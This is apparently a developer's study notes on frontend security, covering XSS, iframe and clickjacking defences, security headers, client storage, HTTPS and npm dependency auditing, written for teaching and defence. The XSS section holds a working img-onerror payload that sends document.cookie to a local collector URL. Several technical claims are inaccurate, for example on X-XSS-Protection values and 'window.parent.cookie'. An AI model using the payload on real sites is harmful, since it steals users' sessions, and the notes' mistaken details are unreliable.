Overview
========
[IMG:1]

==========================
XSS (Cross-Site Scripting)
==========================
[IMG:2]
Lets say you are reading value/query param from url (like ?name="Saketh kota") and showing it in UI. Now in place of the "Saketh Kota", you can insert anything like an html element / form elements,
to steal personal/sesitive informations from cookies.
**Note: Now a days new browsers are smart enough not allowing you to insert a script tag in URL, but they still allow you to insert html tags.
        So you can insert a img tag instea and not give any source or give a dummy string. Then the onerror function in image tag will be executed in which you can write your javascript to steam cookies.

Vulnerabilities
...............
1. User session hijacking => stealing cookie information
     Example: ?name=<img src="does-not-exist" onerror="var img = document.createElement(\'img\');img.src=`http://127.0.0.1:5500/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
    (You can encode it using encodeURIComponent() and paste it in the URL.)
(For remaining vulnerability examples, view below images)
2. Unauthorized activities => If there is any publicly exposed function which makes api call, you can call that from your browser (from url) to pass hacking code. Like sometimes you have seen ou dont make a post in facebook but it get posted by hacker.
3. Capturing Keystrokes => In the url, you can mention code to capture key strokes and pass it to your end point
4. Stealing critical information => You can take the entire html code by injecting your script in the url.
5. Phishing Attack => You can inject HTMl code from the URL which can be a form element replacing the actual form in the website. Phishing is like making users do wrong things, such as when you click bad link, they inject malware into your system
[IMG:3-6]


Mitigations
...........
1. List all possible ways to take user input - (Like url, forms, input fields and sanitize them)
2. Replace innerHtml with innerText / textContent
3. Escaping  - (Escape html statring (<) ending (>) tags from the input)
4. Use libraries like React which by defult takes cares of thse XSS - (Because when you mention {name} in jsx, it expects only the text/js code text so by defult ignores of all these html injections)
5. Sanitize: DOMPurify - (If you are not using librarirs or even within libraries if you re using DangerouslyStyledInnerHTML kind of this to inject HTML in jsx instead of text, you can use libraries like DOMPurify to purify the input text, which takes cares of all the security issues in the input text)
6. CSP Headers - (Sometimes things are not in your hands like someone can inject third party resource/script into your browser. To handle all these, from server, you can add few headers which tells which resources/scripts to trust and what type of content to accept and all to overcome these issues)
7. Avoid using 'eval'

[IMG:7-13]

CSP (Content Security Policy) 
.............................
1. Allowed Sources - Tells from what sources/origins you can load the scripts/images/iframes...
2. Script nonce - To differentiate the inline scripts injected by you or by hacker by adding 'nonce' attribute inside your safe script tag - <script nonce="randomKey"></script>
3. Report-only mode - Now everyone can see why you are not able to load few resources script/img/iframe based on your console error message about Content-Security-Policy. So you can restrict to whom all to report that error using 'report-to defult/report-uri default(older one)' headers.

View index.js inside mitigation folder


SUMMARY of XSS: Anyone can inject anything from url - query param, if you are showing that query param in UI/code. They can steal critical info/capture Keystrokes and many more. As a developer we need to take care of these things by not using innerHTML, by escaping '<','>' tags and by sanitizing inputs before use using some libraries like DOMPurify. Last not the least we need to set headers like Content-Security-Policy to specify from what all origin we are allowed to download scrips/images/iframes...


================
IframeProtection
================

You show Adds in your website as iframes.

When you are able to import another wbsite into your website using iframe there will be various security issues.

[IMG:14]

Vulnerabilities
...............
1. Click Hijacking - On top of iframe you can have your own button, on click on which data is sent to you
2. Data theft via javascript - When you inject an iframe thinking it is safe, it can access parent/main website data using window.parent.document/window.parent.cookie. Once it gets the document object, it can do everything. Now a days modern websites restrict this but it is still a threat in older websites
3. Session & Cookie theft - Same as above, you can get access to parent cookie using window.parent.cookie


Mitigations
...........

1. X-Frame-Options 'sameorigin' - If you set this header to 'sameorigin', then no other orign except google will be able to render google.com as iframe
2. CSP: frame-ancestors 'self' - This is a newer header and X-Frame-Options is older one, serving the same purpose
3. sandbox iframe - Also from Parent while importing iframes, you can set an argument called sandbox -  sandbox="allow-same-origin allow-scripts allow-modals" which makes sure no scripts(like window.parent.cookie) executes in the sandbox other than just html until and unless you give allow-scripts as a value in sandbox.
4. Whenever you set a cookie from server, you can set below attributes also
        httpOnly: true - By setting this, you cannot accees cookie from client using document.cookie. You can only access it from server
        secure: true - By setting this, cookie will be only sent if it is https. If it is http then the cookie wont be sent
        sameSite: 'strict' - By setting this, when application is navigating from one page to another or when making third party API calls, the cookie wont be sent. That you can access them only in your site and not in other sites
        (You can see all these all columns when you click on Cookies in Application tab)

Note: There are many other security related attributes in iframe and different security related values in sandbox attribute. You can reffer mdn docs.
Note: If a Parent website trying to access data from child website and you want to restrict that from child you can do as below in child html code
 <script>
      if (top != self) {
        top.location = self.location;
      }
 </script>
 //This is not required in modern borwsers as it will take care of such threats, but still it is safe to have



===============
SecurityHeaders
===============

[IMG:15-18]

1. X-Powered-By - This header will tell what server you are using like Express/Tomcat... Based on this hacker will inject code based on the server code and he know security vulnerabilities of each specific server
2. Referrer-Policy - When you navigate from one website/domain to another website/domain, the current website will tell from which domain you came, through the 'referer' header in the (Request Headers). This has the entire url including the query params of the previous website url from which you came to current website. So you can stop seding this 'referer' or just send send origin name instead of all params by setting up the 'Refferer-Policy' header in General Headers.
3. X-Content-Type-Option - In olden browsers there used to be something called as Sniffing. When client expects a jpg file and sets Content-Type to jpg. Now when server sends HTML text instead of image, browser smartly reads the content and understand it is HTML and changes Content-Type to HTML. This is not correct as any middle person (hacker) can inject HTML code in between. To overcome this we set the header 'X-Content-Type-Option' to 'nosniff'. This will not change the Content-Type based on the content.
4. X-XSS-Protection - You can set these to 0(no XSS), 1(allow XSS), 1; mode=block(allow but if doing any malicious activity then block). You can ignore this header if setting proper Content-Security-Policy headers. CSP headers is the right way to deal with these XSS.
5. HSTS (Strict Transport Security) - When you request through http, if it's first time then the request is sent to server and server redirects it to https with 301 status code (you need to write code in server to do this). Which then makes request again with https and now browser sets a header called Strict-Transport-Security to  "max-age=31536000; includeSubDomains; preload", so that next subsequent http requests will be automatically redirected to https (301) at the browser level withouth reaching to server.



====================
Client Side Security
====================

[IMG:19-26]

Points to note:
- Firstly store sensitive info and all in server itself. If storing anything in client for some reasons then do not forget to set token expiry and encryption when storing sensitive data
- When storing Authentication related tokens, use HQT/OAuth, set session expiry and provide MFA (Multi Factor Authentication) like OTP and all for double safety
- To take it to next level add a checksum(originalData). This will taken the sesitive data and returns as an argument and return the same result always for same data. And you store this checksum in local storage. When you retrieve sensitive data, you retrieve its checksum along with it and you compare that checksum with your checksum(originalData) logic to see if both are equal for second level of security check
- When storing anythig in browser storages like localStorage, cookies etc.. consider their storage limits in mind
- Ideally cookies should be set from server along with its headers. If you are setting it from client for some reason then make sure to add 'httpOny' 'secure' header to it so that it can only be acceessed through http and not using document.cookie, so that no third party extension or hacker can steal it.


============================
Secure Communication (HTTPS)
============================

[IMG:27]

1. Data Encryption (TLS) - Data is always tranffered in TLS which makes is secure, because it is encrypted and no middle men can read it.
2. Authentication (SSL & TLS) - Its safe becaues of SSL certificate provided by SSL/TLS Authorities, which is used when client requests some data.
3. Data Integrity (MAC) - Internal checksum (MAC- Message Authentication Code) is provided by HTTPS by default for double check
4. Compliance with Security Standards - Many third party libraries (like payment gateways) request you to move to HTTPS to utilize them
5. Trust and Reputation - When you try to change a https website to http, it will by default redirect to https again
6. Faster website loading (HTTP2) - To utilzie HTTP2 (which is much faster) you need to be in https


===================
Dependency Security
===================

[IMG:28-35]

There can be issues/security vulnerabilities in the packages that you installed, or the nested dependency packages that you installed.
1. To check this you can run "npm run audit" in your code which gives list of all vulnerabilities and suggests you to fix it through "npm audit fix". But never fix them using this command as it will updrage packges and nested dependencies to stable version but you may face issues in your code as it is not updated as the new version. So code can break. Good thing is to check each package one by one and fix it.
   npm audit report - generates detailed report
2. In your package itself - npm set audit true. Everytime during npm install/update it will automatically be executed and highlights vulnerabilities
3. Sometimes we dont run the report daily so we can monitor it using some tools:
   Dependadbot(dependadbot.yml) - Gives you weekly/monthly report of these security vulnerabilities in the dependencies.
   codeql - it goes one step ahead and does code monitoring as well along with dependency monitoring
4. Dependency locking - Generally we have pipelines set up which runs when we merge a code. If there are frequent dependency erros, the build will fail frequently. To avoid these, you need to lock the dependencies using package-lock.json/yarn.lock - It locks the version of direct and indirect dependencies and it will not change everytime you run npm install, until you update them manually.
5. Security penetration testing using tools - Even if we take care of above things, still there are lot of things on which we need help from tools. Example - App scanner, burp suite, zed attack proxy

